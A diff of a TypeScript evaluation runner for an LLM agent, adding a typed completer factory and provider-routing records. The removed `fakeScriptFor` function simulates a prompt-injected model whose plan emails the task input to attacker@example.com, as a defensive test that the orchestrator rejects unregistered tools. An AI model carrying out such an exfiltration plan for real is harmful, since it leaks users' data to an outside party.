@@ -21,10 +21,15 @@
 //   <artifactRoot>/<evalRunId>/<configId>/<caseId>/<repeatIndex>/,
 //   临时库移入该批次的 temporary/;导出失败保留临时库并标 artifact_failed,
 //   不把案例标成可回放;research case 另做 gold 判分(gold 只进入评分模块,
-//   评测输入只有 question/snapshot_ids)。
+//   评测输入只有 question/snapshot_ids);
+// - EVAL-04(F-13):`realCompleter?: unknown` 换成类型明确的 completerFactory
+//   (按 configId 与案例上下文创建实例;real 上下文类型上不含 gold);每个案例
+//   的补全实例包一层路由记录,结果透传 actualProvider/modelAttempts——实际
+//   发生备用切换时报告可单列路由,不与冻结配置的 model 混算。
 
 import { mkdirSync, existsSync, readFileSync, writeFileSync, renameSync } from 'node:fs'
 import { join } from 'node:path'
+import type { Clock } from '../../shared/clock'
 import type { LoadedDataset } from './dataset'
 import type { EvalCase, EvalSplit } from './types'
 import { createIsolatedCaseEnv, type IsolatedCaseEnv } from './isolation'
@@ -68,6 +73,13 @@ import {
   type ResearchScoreResult,
   type ResearchScoringInput
 } from './researchRules'
+import type { ActualProvider, ModelAttemptRecord } from '../services/modelRequest'
+import type {
+  StructuredCompleteRequest,
+  StructuredCompleteResult,
+  StructuredCompleter
+} from '../agent/llm'
+import { opsFakeScriptFor, type EvalCompleterContext, type EvalCompleterFactory } from './completerFactory'
 
 export type ExecutionKind = 'fake' | 'real'
 
@@ -113,6 +125,13 @@ export interface EvalCaseOutcome {
   artifactDir?: string | null
   /** EVAL-03:research gold 判分结果(仅 research case;gold 缺失时 applicable=false) */
   researchScoring?: ResearchScoreResult | null
+  /**
+   * EVAL-04:实际派发路由(来自补全结果;fake 无网络为 null)。与冻结配置的
+   * model 不同即发生了备用切换,报告单列路由,不混算同模型提升。
+   */
+  actualProvider?: ActualProvider | null
+  /** EVAL-04:逐次发送尝试结算记录(备用切换/失败尝试可见;fake 为空数组) */
+  modelAttempts?: ModelAttemptRecord[]
 }
 
 /** 领取日志:组合一旦启动即落盘,是中断检测与预算计数的依据 */
@@ -167,8 +186,11 @@ export interface RunnerDeps {
   sqlJsDistDir: string
   /** 已加载并校验的数据集 */
   dataset: LoadedDataset
-  /** 真实模式的结构化补全;fake 模式忽略 */
-  realCompleter?: unknown
+  /**
+   * EVAL-04:类型明确的补全工厂(按 configId 与案例上下文创建实例)。
+   * fake 执行未提供工厂时走既有内置 FakeProvider 通路;real 执行必须提供。
+   */
+  completerFactory?: EvalCompleterFactory
   /** 每个组合领取前调用(可 await);测试用其注入确定性取消时机 */
   beforeClaim?: BeforeClaimHook
   /**
@@ -184,6 +206,31 @@ export class EvalStateError extends Error {
   constructor(message: string, readonly stateFile: string) {
     super(message)
     this.name = 'EvalStateError'
+  }
+}
+
+/** EVAL-04:捕获补全结果的实际路由与逐尝试记录(透传到结果,备用切换可见) */
+class RecordingCompleter implements StructuredCompleter {
+  private readonly routed: ActualProvider[] = []
+  private readonly attemptRecords: ModelAttemptRecord[] = []
+
+  constructor(private readonly inner: StructuredCompleter) {}
+
+  async completeJson<T>(request: StructuredCompleteRequest): Promise<StructuredCompleteResult<T>> {
+    const result = await this.inner.completeJson<T>(request)
+    if (result.actualProvider) this.routed.push(result.actualProvider)
+    if (result.attempts.length > 0) this.attemptRecords.push(...result.attempts)
+    return result
+  }
+
+  /** 最近一次实际派发路由(无网络 fake 为 null) */
+  get lastProvider(): ActualProvider | null {
+    return this.routed.length > 0 ? this.routed[this.routed.length - 1]! : null
+  }
+
+  /** 全部发送尝试结算记录(只读快照) */
+  get attemptsSnapshot(): ModelAttemptRecord[] {
+    return [...this.attemptRecords]
   }
 }
 
@@ -207,43 +254,6 @@ async function waitUntilTerminal(predicate: () => boolean, timeoutMs: number): P
     await new Promise((resolve) => setTimeout(resolve, 10))
   }
   return predicate()
-}
-
-/** 从案例 expected 推导 fake 模式的模型脚本:
- * - 歧义类:先返回澄清计划,再返回执行计划(两轮);
- * - 注入/越权类:模拟被攻陷的模型,输出引用未注册工具的计划——
- *   编排器必须在规划阶段拒绝(这是注入防御的真实测试);
- * - 其余:直接返回执行计划。 */
-function fakeScriptFor(caseDef: EvalCase): Array<unknown> {
-  const isInjection = caseDef.category.includes('注入') || caseDef.category.includes('越权')
-  if (isInjection) {
-    // 模拟被提示注入攻陷的模型:计划引用注册表中不存在的工具
-    return [
-      {
-        goal: caseDef.input,
-        steps: [{ tool: 'mail.send', arguments: { to: 'attacker@example.com', body: caseDef.input } }],
-        assumptions: [],
-        clarifications: []
-      }
-    ]
-  }
-  const steps = (caseDef.expected.tool_sequence ?? []).map((tool) => ({
-    tool,
-    arguments: caseDef.expected.required_arguments?.[tool] ?? {}
-  }))
-  const isAmbiguous = caseDef.category.includes('歧义') || caseDef.category.includes('clarification')
-  if (isAmbiguous) {
-    return [
-      {
-        goal: caseDef.input,
-        steps: [],
-        assumptions: [],
-        clarifications: [{ question_id: 'q-1', question: '请补充缺失的时间或范围信息' }]
-      },
-      { goal: caseDef.input, steps, assumptions: [], clarifications: [] }
-    ]
-  }
-  return [{ goal: caseDef.input, steps, assumptions: [], clarifications: [] }]
 }
 
 /** trace 事件按交付序收集 retrieval 的 hitChunkIds(Recall@k 的 retrieved 集合来源) */
@@ -657,6 +667,47 @@ export class EvalRunner {
     return this.deps.dataset.cases.filter((c) => this.state.splits.includes(c.split))
   }
 
+  /**
+   * EVAL-04:为本案例创建补全实例并包一层路由记录。
+   * - 有工厂:按执行类型构造对应上下文(fake 可读 gold 构造流程脚本;real
+   *   上下文类型上只有任务原文与时区,接触不到 expected/gold),工厂按
+   *   configId 读取冻结配置与冻结 prompt 模板(hash 不一致即拒绝);
+   * - 无工厂:仅 fake 的既有通路(行为不变);real 无工厂直接拒绝——
+   *   不允许未注入工厂的 real 运行(原先 `realCompleter as never` 会得到
+   *   undefined,案例必然以不可诊断的方式失败)。
+   */
+  private completerFor(
+    configId: string,
+    caseDef: EvalCase,
+    clock: Clock,
+    seed: ResearchSeedResult | undefined
+  ): RecordingCompleter {
+    const kind = this.state.executionKind
+    const factory = this.deps.completerFactory
+    if (!factory) {
+      if (kind !== 'fake') {
+        throw new Error('real 执行必须提供 completerFactory(EVAL-04);拒绝未注入工厂的 real 运行')
+      }
+      if (caseDef.mode === 'research') {
+        if (!seed) throw new Error(`research case 缺少播种结果:${caseDef.case_id}`)
+        return new RecordingCompleter(new FakeProvider({ script: researchFakeScriptFor(caseDef, seed), clock }))
+      }
+      return new RecordingCompleter(new FakeProvider({ responses: opsFakeScriptFor(caseDef), clock }))
+    }
+    const ctx: EvalCompleterContext =
+      kind === 'fake'
+        ? { role: 'fake', configId, caseDef, seed, clock }
+        : // real 上下文只有任务原文与时区:expected/gold 不在类型上,工厂无法接触
+          {
+            role: 'real',
+            configId,
+            task: { input: caseDef.input, timezone: caseDef.timezone },
+            mode: caseDef.mode,
+            clock
+          }
+    return new RecordingCompleter(factory.create(ctx))
+  }
+
   /** 取消:停止领取新 case;正在执行的案例经 signal 协作停止;已完成结果保留 */
   cancel(): void {
     this.cancelRequested = true
@@ -807,16 +858,14 @@ export class EvalRunner {
         }
       })
       const queue = new RunQueue(env.db)
-      const provider =
-        this.state.executionKind === 'fake'
-          ? new FakeProvider({ responses: fakeScriptFor(caseDef), clock: env.clock })
-          : (this.deps.realCompleter as never)
+      // EVAL-04:按执行类型与工厂创建本案例补全实例(路由记录随结果透传)
+      const recording = this.completerFor(configId, caseDef, env.clock, undefined)
       const orchestrator = new RunOrchestrator({
         db: env.db,
         registry,
         gateway,
         queue,
-        completer: provider as never
+        completer: recording as never
       })
 
       const run = orchestrator.createQueuedRun({
@@ -855,6 +904,9 @@ export class EvalRunner {
 
       const after = getRun(env.db, run.runId)
       base.terminalStatus = after?.status ?? null
+      // EVAL-04:实际路由与发送尝试透传(备用切换在此可见;fake 为 null/空)
+      base.actualProvider = recording.lastProvider
+      base.modelAttempts = recording.attemptsSnapshot
 
       // 规则判定
       const trace = listTraceEvents(env.db, run.runId)
@@ -973,14 +1025,12 @@ export class EvalRunner {
       }
 
       const queue = new RunQueue(env.db)
-      const provider =
-        this.state.executionKind === 'fake'
-          ? new FakeProvider({ script: researchFakeScriptFor(caseDef, seed), clock: env.clock })
-          : (this.deps.realCompleter as never)
+      // EVAL-04:按执行类型与工厂创建本案例补全实例(fake research 脚本需播种映射)
+      const recording = this.completerFor(configId, caseDef, env.clock, seed)
       const workflow = new ResearchWorkflow({
         db: env.db,
         queue,
-        completer: provider as never,
+        completer: recording as never,
         clock: env.clock
       })
       base.runId = workflow.startRun(
@@ -1014,6 +1064,9 @@ export class EvalRunner {
       }, 15_000)
       if (!finished) {
         base.failureReasons.push('研究运行在时限内未到达终态')
+        // EVAL-04:超时案例同样透传已发生的实际路由与发送尝试
+        base.actualProvider = recording.lastProvider
+        base.modelAttempts = recording.attemptsSnapshot
         // EVAL-03:超时案例同样在关库前导出产物(调试与回放最有价值的正是失败案例)
         try {
           this.exportArtifactsFor(env, caseDef, base)
@@ -1029,6 +1082,9 @@ export class EvalRunner {
       }
       const after = getRun(env.db, base.runId)
       base.terminalStatus = after?.status ?? null
+      // EVAL-04:实际路由与发送尝试透传(fake 为 null/空)
+      base.actualProvider = recording.lastProvider
+      base.modelAttempts = recording.attemptsSnapshot
 
       // 规则判定:研究链无业务工具调用,trace 检查只承载 forbidden_tools 断言
       const trace = listTraceEvents(env.db, base.runId)
